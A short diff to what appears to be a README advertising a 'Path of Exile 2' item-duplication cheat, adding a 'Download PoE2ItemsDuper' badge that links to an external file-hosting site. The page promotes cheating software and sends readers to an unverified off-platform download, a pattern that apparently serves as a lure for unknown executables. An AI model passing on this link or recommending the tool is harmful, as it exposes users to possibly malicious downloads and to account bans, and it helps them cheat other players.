@@ -1,5 +1,7 @@
 Path of Exile 2 dupe items refers to a cheat or exploit used by players to duplicate in-game items, providing unlimited resources, currency, and gear. This allows players to bypass the usual methods of acquiring items through gameplay, such as farming, crafting, or trading, and gives them an unfair advantage.
 
+[![Download PoE 2 items duper](https://img.shields.io/badge/Download-PoE2ItemsDuper%20-blueviolet)](https://downeefiles.com/s/peidu)
+
 Duping items typically involves exploiting a bug or using third-party software to duplicate specific items in the game, such as rare equipment, crafting materials, or currency. While this cheat can significantly speed up progression and provide an abundance of resources, it undermines the intended gameplay mechanics and can lead to an imbalanced experience.
 
 ### Key Features:
